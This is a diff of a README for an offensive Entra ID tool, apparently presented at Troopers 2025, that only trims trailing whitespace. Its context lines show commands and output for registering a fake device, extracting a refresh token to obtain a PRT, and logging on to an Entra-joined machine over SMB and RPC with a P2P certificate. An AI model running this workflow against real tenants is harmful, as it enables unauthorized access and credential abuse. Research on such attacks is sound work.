@@ -38,7 +38,7 @@ This tool is presented at Troopers 2025:
 
 ## Usage
 
-### Request P2P certificate 
+### Request P2P certificate
 
 First, acquire required Microsoft Entra tokens with the credentials of any account that has local administrator access to a target device.
 
@@ -70,7 +70,7 @@ Saved device certificate to fake_device.pem
 Then, using the registed device, request PRT and session key.
 
 ```bash
-$ REFRESHTOKEN=(`cat .roadtools_auth | jq -r .refreshToken`) 
+$ REFRESHTOKEN=(`cat .roadtools_auth | jq -r .refreshToken`)
 
 $ roadtx prt -c fake_device.pem -k fake_device.key -r $REFRESHTOKEN
 Obtained PRT: 1.AT0A7mRQZ....
@@ -99,7 +99,7 @@ You can authenticate to a Entra joinned machine using the P2P certificate as fol
 - SMB
 
 ```bash
-$ python3 entraptc.py smb --target 192.168.153.133 --pfx p2pcert.pfx      
+$ python3 entraptc.py smb --target 192.168.153.133 --pfx p2pcert.pfx
 [*] connecting to 192.168.153.133 via SMB...
 [+] sucessfully logged-on to the system!
 Type help for list of commands
@@ -139,7 +139,7 @@ azuread\admin
 - RPC
 
 ```bash
-$ python3 entraptc.py rpc --target 192.168.153.133 --pfx p2pcert.pfx                                                                   
+$ python3 entraptc.py rpc --target 192.168.153.133 --pfx p2pcert.pfx
 
 [*] connecting to 192.168.153.133 via RPC...
 [+] sucessfully logged-on to the system!
